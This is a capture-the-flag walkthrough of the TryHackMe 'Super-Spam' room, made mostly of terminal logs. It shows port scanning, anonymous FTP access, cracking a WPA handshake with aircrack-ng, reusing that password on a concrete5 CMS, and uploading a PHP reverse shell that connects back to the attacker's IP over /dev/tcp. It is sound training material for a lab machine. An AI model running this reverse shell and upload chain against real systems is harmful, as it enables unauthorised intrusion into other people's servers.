----
Defeat the evil Super-Spam, and save the day!!
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/f8f1345b6e420c2f12ab1cd9f1e2ede9.png)

### Task 1  Defeat Super-Spam

 Start Machine

**General Uvilix:**  

Good Morning! Our intel tells us that he has returned. Super-spam, the evil alien villain from the planet Alpha Solaris IV from the outer reaches of the Andromeda Galaxy. He is a most wanted notorious cosmos hacker who has made it his lifetime mission to attack every Linux server possible on his journey to a Linux-free galaxy. As an avid Windows proponent, Super-spam has now arrived on Earth and has managed to hack into OUR Linux machine in pursuit of his ultimate goal. We must regain control of our server before it's too late! Find a way to hack back in to discover his next evil plan for total Windows domination! **Beware**, super-spam's evil powers are to confuse and deter his victims.

Credits: [ARZ101](https://tryhackme.com/p/ARZ101), [DrXploiter](https://tryhackme.com/p/DrXploiter), [Aksheet](https://tryhackme.com/p/Aksheet), [kiwiness](https://tryhackme.com/p/kiwiness), [wraith0p](https://tryhackme.com/p/wraith0p)

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.130.225 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.130.225:80
Open 10.10.130.225:4019
Open 10.10.130.225:5901
Open 10.10.130.225:6001
Open 10.10.130.225:4012
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 20:19 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:19
Completed NSE at 20:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:19
Completed NSE at 20:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:19
Completed NSE at 20:19, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:19
Completed Parallel DNS resolution of 1 host. at 20:19, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:19
Scanning 10.10.130.225 [5 ports]
Discovered open port 80/tcp on 10.10.130.225
Discovered open port 5901/tcp on 10.10.130.225
Discovered open port 6001/tcp on 10.10.130.225
Discovered open port 4012/tcp on 10.10.130.225
Discovered open port 4019/tcp on 10.10.130.225
Completed Connect Scan at 20:19, 0.18s elapsed (5 total ports)
Initiating Service scan at 20:19
Scanning 5 services on 10.10.130.225
Completed Service scan at 20:20, 17.32s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.130.225.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:20
NSE: [ftp-bounce 10.10.130.225:4019] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.14% done; ETC: 20:20 (0:00:00 remaining)
NSE Timing: About 99.86% done; ETC: 20:21 (0:00:00 remaining)
Completed NSE at 20:21, 73.40s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:21
NSE Timing: About 95.00% done; ETC: 20:22 (0:00:02 remaining)
NSE Timing: About 95.00% done; ETC: 20:22 (0:00:03 remaining)
Completed NSE at 20:22, 79.43s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:22
Completed NSE at 20:22, 0.00s elapsed
Nmap scan report for 10.10.130.225
Host is up, received user-set (0.18s latency).
Scanned at 2023-07-05 20:19:56 EDT for 170s

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.29
4012/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 866004c0a5364667f5c7240fdfd00314 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjPfdefRhbpiW/oi5uUVtVRW/pYZcnADODOU4e80iSnuqWfRB5DAXTpzKZNw5JBQGy+4Amwz0DyX/TlYBgXRxPXwFimpBXnc02jpMknSaDzdRnInU8wFcsBQc+GraYz1mMHvRcco2FfIrKurDbyEsBCzwJuk/RKdSq2rcFLhq8QAPoxc9FQcNeUIZrBt53/7+fD7B7NvjjU22+hXZhjt6PLC3LDWcaMvpYCxMYGwKoC9xTs+FtzEFrt6yWzKrXV1iNuKdNyt8vu22bcPl2GrQ9ai9I89DEY4wB3dADP6AfNikbi0QWjdNbW2fhblG9PvKRu9s3IbpVueX2qBfInuAF
|   256 ced2f6ab697faa31f54970e58f62b0b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIs/ZpOvCaKtCEwW4YraPciYLZnrRXDR6voHu0PipWaQpcdnsc8Vg1WMpkX0xgjXc9eD3NuZmBtTcIDTJXi7v4U=
|   256 73a0a197c433fbf44a5c77f6ac9576ac (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHHX1bbkvh6bRHE0hWipYWoYyh+Q+uy3E0yCBOoyY888
4019/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 IDS_logs
|_-rw-r--r--    1 ftp      ftp           526 Feb 20  2021 note.txt
5901/tcp open  vnc     syn-ack VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)
6001/tcp open  X11     syn-ack (access denied)
Service Info: Host: example.com; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:22
Completed NSE at 20:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:22
Completed NSE at 20:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:22
Completed NSE at 20:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.50 seconds



┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.130.225 4019
220 (vsFTPd 3.0.3)
^C
                                                                                                 
┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.130.225 4012
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
^C
                                                                                                 
┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.130.225 5901
RFB 003.008


┌──(witty㉿kali)-[~/Downloads]
└─$ ftp 10.10.130.225 4019
Connected to 10.10.130.225.
220 (vsFTPd 3.0.3)
Name (10.10.130.225:witty): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48637|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 IDS_logs
-rw-r--r--    1 ftp      ftp           526 Feb 20  2021 note.txt
226 Directory send OK.
ftp> more note.txt
12th January: Note to self. Our IDS seems to be experiencing high volumes of unusual activity.
We need to contact our security consultants as soon as possible. I fear something bad is going
to happen. -adam

13th January: We've included the wireshark files to log all of the unusual activity. It keeps
occuring during midnight. I am not sure why.. This is very odd... -adam

15th January: I could swear I created a new blog just yesterday. For some reason it is gone... -a
dam

24th January: Of course it is... - super-spam :)

ftp> cd IDS_logs
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||49319|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         14132 Feb 20  2021 12-01-21.req.pcapng
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed010.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed013.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed01h3.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed01ha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed50n0.c
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed50n0.t
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed6.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed806.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed810.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed816.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed86.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammeda1ha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammedabha.s
-rw-r--r--    1 ftp      ftp         74172 Feb 20  2021 13-01-21.pcap
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed22n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed22v0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed245a.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed245v.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed24ha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed28v0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2a5v.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2bha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2w5v.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2we8.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2wev.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2wv0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2wv8.s
-rw-r--r--    1 ftp      ftp         11004 Feb 20  2021 14-01-21.pcapng
-rw-r--r--    1 ftp      ftp         74172 Feb 20  2021 16-01-21.pcap
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed22n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed50n0.a
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed50n0.c
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed50n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed52n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed00050.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed100.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed10050.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed10056.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed10086.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed11.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed12.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed12086.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed130.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed190.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed19046.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed1906.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed19086.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed2.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed200.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed205.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed23.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed280.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed285.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed3.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed4.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed410.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed430.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed480.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed490.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed7.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed72.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed75.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed80.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed81.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed82.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed9.s
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls -lah
229 Entering Extended Passive Mode (|||40274|)
150 Here comes the directory listing.
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 .
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 ..
drwxr-xr-x    2 ftp      ftp          4096 May 30  2021 .cap
drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 IDS_logs
-rw-r--r--    1 ftp      ftp           526 Feb 20  2021 note.txt
226 Directory send OK.
ftp> cd .cap
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||41417|)
150 Here comes the directory listing.
-rwxr--r--    1 ftp      ftp        370488 Feb 20  2021 SamsNetwork.cap
226 Directory send OK.
ftp> mget *
mget SamsNetwork.cap [anpqy?]? ye
229 Entering Extended Passive Mode (|||43967|)
150 Opening BINARY mode data connection for SamsNetwork.cap (370488 bytes).
100% |****************************************************|   361 KiB  226.10 KiB/s    00:00 ETA
226 Transfer complete.
370488 bytes received in 00:01 (196.89 KiB/s)
ftp> ls -lah
229 Entering Extended Passive Mode (|||42285|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 30  2021 .
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 ..
-rw-r--r--    1 ftp      ftp           249 Feb 20  2021 .quicknote.txt
-rwxr--r--    1 ftp      ftp        370488 Feb 20  2021 SamsNetwork.cap
226 Directory send OK.
ftp> more .quicknote.txt
It worked... My evil plan is going smoothly.
 I will place this .cap file here as a souvenir to remind me of how I got in...
 Soon! Very soon!
 My Evil plan of a linux-free galaxy will be complete.
 Long live Windows, the superior operating system!

┌──(witty㉿kali)-[~/Downloads]
└─$ wireshark SamsNetwork.cap

┌──(witty㉿kali)-[~/Downloads]
└─$ aircrack-ng SamsNetwork.cap 
Reading packets, please wait...
Opening SamsNetwork.cap
Read 9741 packets.

   #  BSSID              ESSID                     Encryption

   1  D2:F8:8C:31:9F:17  Motocplus                 WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening SamsNetwork.cap
Read 9741 packets.

1 potential targets

Please specify a dictionary (option -w).

using rockyou wordlist

      [00:07:07] 799684/14344392 keys tested (1901.54 k/s) 

      Time left: 1 hour, 58 minutes, 43 seconds                  5.57%

                       Current passphrase: sandiago                   
                           KEY FOUND! [ sandiago ]

      Master Key     : 93 5E 0C 77 A3 B7 17 62 0D 1E 31 22 51 C0 42 92 
                       6E CF 91 EE 54 6B E1 E3 A8 6F 81 FF AA B6 64 E1 

      Transient Key  : 70 72 6D 26 15 45 F9 82 D4 AE A9 29 B9 E7 57 42 
                       7A 40 B4 D1 C3 27 EE 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
      EAPOL HMAC     : 1E FB DC A0 1D 48 49 61 3B 9A D7 61 66 71 89 B0 

┌──(witty㉿kali)-[~/Downloads]
└─$ aircrack-ng -w /usr/share/wordlists/rockyou.txt SamsNetwork.cap

https://vocal.com/secure-communication/eapol-extensible-authentication-protocol-over-lan/

Ctrl +shift +p preferences

find http


HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 68
Date: Thu, 18 Feb 2021 16:10:51 GMT
Connection: keep-alive

<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>


┌──(witty㉿kali)-[~/Downloads]
└─$ curl http://10.10.154.35/ | head
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:-  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:-  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:-  0     0    0     0    0     0      0      0 --:--:--  0:00:03 --:-  0     0    0     0    0     0      0      0 --:--:--  0:00:04 --:--:--     0<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" type="text/css" href="/concrete5/concrete/themes/elemental/css/bootstrap-modified.css">
    <link href="/concrete5/application/files/cache/css/elemental/main.css?ts=1617976151" rel="stylesheet" type="text/css" media="all">    
<title>Home :: Super-Spam</title>

<meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
<meta name="generator" content="concrete5 - 8.5.2"/>


http://10.10.51.105/concrete5/index.php/blog/linux-bloggerscom


Linux-Bloggers.com
Apr 9, 2021 Adam_Admin 

http://10.10.51.105/concrete5/index.php/blog/neque-porro-quisquam

Neque porro quisquam
Apr 9, 2021 Benjamin_Blogger 


http://10.10.51.105/concrete5/index.php/blog/ipsum

Ipsum
Apr 9, 2021 Lucy_Loser 


http://10.10.51.105/concrete5/index.php/blog/lorem


Lorem
Apr 9, 2021 Donald_Dump 


https://documentation.concretecms.org/user-guide/guided-tour/logging-in-and%20out

http://10.10.51.105/concrete5/index.php/login

Donald_Dump: sandiago

https://hackerone.com/reports/768322


┌──(witty㉿kali)-[~]
└─$ cat revshell.php 
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.19.103/4444 0>&1'");?>

http://superspam.thm/concrete5/index.php/dashboard/system

http://superspam.thm/concrete5/index.php/dashboard/system/files/filetypes

flv, jpg, gif, jpeg, ico, docx, xla, png, psd, swf, doc, txt, xls, xlsx, csv, pdf, tiff, rtf, m4a, mov, wmv, mpeg, mpg, wav, 3gp, avi, m4v, mp4, mp3, qt, ppt, pptx, kml, xml, svg, webm, ogg, ogv, php

http://superspam.thm/concrete5/index.php/dashboard/files/search

upload revshell



URL to File

http://superspam.thm/concrete5/application/files/7716/8868/6228/revshell.php

click

Tracked URL

http://superspam.thm/concrete5/index.php/download_file/18/0

Title

revshell.php

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvp 4444                                       
listening on [any] 4444 ...
connect to [10.8.19.103] from superspam.thm [10.10.225.4] 60382
bash: cannot set terminal process group (875): Inappropriate ioctl for device
bash: no job control in this shell
<w/html/concrete5/application/files/7716/8868/6228$ which python
which python
<w/html/concrete5/application/files/7716/8868/6228$ which python3
which python3
/usr/bin/python3
<w/html/concrete5/application/files/7716/8868/6228$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<228$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<w/html/concrete5/application/files/7716/8868/6228$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
www-data
super-spam
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:dc:f6:67:c8:f7 brd ff:ff:ff:ff:ff:ff
    inet 10.10.225.4/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2601sec preferred_lft 2601sec
    inet6 fe80::dc:f6ff:fe67:c8f7/64 scope link 
       valid_lft forever preferred_lft forever
www-data@super-spam:/home/personal/Work$ find / -type f -name flag.txt 2>/dev/null
<nal/Work$ find / -type f -name flag.txt 2>/dev/null
/home/personal/Work/flag.txt

www-data@super-spam:/home/personal/Work$ cat flag.txt
cat flag.txt
user_flag: flag{-eteKc=skineogyls45«ey?t+du8}

www-data@super-spam:/home/personal/Work$ ls -lah /opt
ls -lah /opt
total 8.0K
drwxr-xr-x  2 root root 4.0K Apr 26  2018 .
drwxr-xr-x 22 root root 4.0K Apr  9  2021 ..
www-data@super-spam:/home/personal/Work$ ls -lah /dev/shm
ls -lah /dev/shm
total 0
drwxrwxrwt  2 root root   40 Jul  6 23:15 .
drwxr-xr-x 17 root root 3.7K Jul  6 23:15 ..
www-data@super-spam:/home/personal/Work$ ls -lah /mnt
ls -lah /mnt
total 8.0K
drwxr-xr-x  2 root root 4.0K Apr 26  2018 .
drwxr-xr-x 22 root root 4.0K Apr  9  2021 ..
www-data@super-spam:/home$ cd lucy_loser
cd lucy_loser
www-data@super-spam:/home/lucy_loser$ ls -lah
ls -lah
total 44K
drwxr-xr-x 7 lucy_loser lucy_loser 4.0K Apr  9  2021 .
drwxr-xr-x 7 root       root       4.0K Feb 20  2021 ..
drwxr-xr-x 2 lucy_loser lucy_loser 4.0K May 30  2021 .MessagesBackupToGalactic
lrwxrwxrwx 1 root       root          9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 lucy_loser lucy_loser  220 Feb 20  2021 .bash_logout
-rw-r--r-- 1 lucy_loser lucy_loser 3.7K Feb 20  2021 .bashrc
drwx------ 2 lucy_loser lucy_loser 4.0K Feb 20  2021 .cache
drwx------ 3 lucy_loser lucy_loser 4.0K Feb 20  2021 .gnupg
-rw-r--r-- 1 lucy_loser lucy_loser  807 Feb 20  2021 .profile
-rw-r--r-- 1 root       root         28 Feb 24  2021 calcs.txt
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 prices
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 work
www-data@super-spam:/home/lucy_loser$ cat calcs.txt
cat calcs.txt
Suzy logs. to be completed.

www-data@super-spam:/home/lucy_loser$ cd .MessagesBackupToGalactic
cd .MessagesBackupToGalactic
www-data@super-spam:/home/lucy_loser/.MessagesBackupToGalactic$ ls -lah
ls -lah
total 1.7M
drwxr-xr-x 2 lucy_loser lucy_loser 4.0K May 30  2021 .
drwxr-xr-x 7 lucy_loser lucy_loser 4.0K Apr  9  2021 ..
-rw-r--r-- 1 lucy_loser lucy_loser 169K Apr  8  2021 c1.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c10.png
-rw-r--r-- 1 lucy_loser lucy_loser 165K Apr  8  2021 c2.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c3.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c4.png
-rw-r--r-- 1 lucy_loser lucy_loser 164K Apr  8  2021 c5.png
-rw-r--r-- 1 lucy_loser lucy_loser 164K Apr  8  2021 c6.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c7.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c8.png
-rw-r--r-- 1 lucy_loser lucy_loser 170K Apr  8  2021 c9.png
-rw-r--r-- 1 lucy_loser lucy_loser  21K Apr  8  2021 d.png
-rw-r--r-- 1 lucy_loser lucy_loser  497 May 30  2021 note.txt
-rw-r--r-- 1 lucy_loser lucy_loser 1.2K Apr  8  2021 xored.py
www-data@super-spam:/home/lucy_loser/.MessagesBackupToGalactic$ cat note.txt
cat note.txt
Note to self. General super spam mentioned that I should not make the same mistake again of re-using the same key for the XOR encryption of our messages to Alpha Solaris IV's headquarters, otherwise we could have some serious issues if our encrypted messages are compromised. I must keep reminding myself,do not re-use keys,I have done it 8 times already!.The most important messages we sent to the HQ were the first and eighth message.I hope they arrived safely.They are crucial to our end goal.
www-data@super-spam:/home/lucy_loser/.MessagesBackupToGalactic$ cat xored.py
cat xored.py
from PIL import Image

print("[!] Note Add extention also.")

pic1_name=input("[-] Enter First Image: " )
pic2_name=input("[-] Enter Second Image: ")
out_name=input("[-] Enter Name of The output image:")


pic1=Image.open(pic1_name)
print("[+] Reading pic1")  #finding the size of picture1 
pic2=Image.open(pic2_name)
print("[+] Reading pic2") #finding the size of picture2

#pic2=pic1.resize(pic1.size) #resizing the pic2 according to pic1
#print("[+] pic2 resized Successfully.")

'''
so that we can xor each and every coordinate of both the pictures
'''

print(pic2) #After Resizing

x_cord_pic1=pic1.size[0]
y_cord_pic1=pic1.size[1]

newpic = Image.new('RGB',pic1.size) # Creating NEW image

for y in range(y_cord_pic1):
    for x in range(x_cord_pic1):
        pixel_1=pic1.getpixel((x,y))
        pixel_2=pic2.getpixel((x,y))
        newpixel =[]
        for p in range(len(pixel_1[:3])): #for all three values

            newpixel.append(pixel_1[p] ^ pixel_2[p]) # ^ --> use to xor two Values
        newpixel=tuple(newpixel)
        #print(newpixel)
        newpic.putpixel((x,y),newpixel)
print("[+] Xored successfully")
print("[+]  Successfully saved as "+out_name)
newpic.save(out_name)

www-data@super-spam:/home/lucy_loser$ ls -lah /home/personal/Workload/
ls -lah /home/personal/Workload/
total 12K
drwxr-xr-x 2 root root 4.0K May 30  2021 .
drwxr-xr-x 5 root root 4.0K May 30  2021 ..
-rw-r--r-- 1 root root  215 Feb 20  2021 nextEvilPlan.txt
www-data@super-spam:/home/lucy_loser$ cat /home/personal/Workload/nextEvilPlan.txt
<loser$ cat /home/personal/Workload/nextEvilPlan.txt
My next evil plan is to ensure that all linux filesystems are disorganised so that these 
linux users will never find what they are looking for (whatever that is)... That should
stop them from gaining back control!
www-data@super-spam:/home/lucy_loser$ cat /home/super-spam/flagOfWindows 
cat /home/super-spam/flagOfWindows 
I am pleased to announce that our plan is going so well. I truly cannot wait to purge the galaxy of that inferior operating system, Linux.
Let this flag of windows stand strongly against the wind for all to see. A pure windows galaxy is what we want!

         
┌──(witty㉿kali)-[~]
└─$ mkdir XOR;cd XOR

www-data@super-spam:/home/lucy_loser$ python3 -m http.server 8000
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


www-data@super-spam:/home/lucy_loser$ python3 -m http.server 8000
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.19.103 - - [06/Jul/2023 23:44:29] "GET / HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:30] code 404, message File not found
10.8.19.103 - - [06/Jul/2023 23:44:30] "GET /robots.txt HTTP/1.1" 404 -
10.8.19.103 - - [06/Jul/2023 23:44:30] "GET /.bash_history HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:31] "GET /.bash_logout HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:31] "GET /.bashrc HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:31] code 404, message No permission to list directory
10.8.19.103 - - [06/Jul/2023 23:44:31] "GET /.cache/ HTTP/1.1" 404 -
10.8.19.103 - - [06/Jul/2023 23:44:32] code 404, message No permission to list directory
10.8.19.103 - - [06/Jul/2023 23:44:32] "GET /.gnupg/ HTTP/1.1" 404 -
10.8.19.103 - - [06/Jul/2023 23:44:32] "GET /.MessagesBackupToGalactic/ HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:32] "GET /.profile HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:33] "GET /calcs.txt HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:33] "GET /prices/ HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:34] "GET /work/ HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:34] "GET /.MessagesBackupToGalactic/c1.png HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:35] "GET /.MessagesBackupToGalactic/c10.png HTTP/1.1" 200 -
10.8.19.103 - - [06/Jul/2023 23:44:37] "GET /.MessagesBackupToGalactic/c2.png HTTP/1.1" 200 -
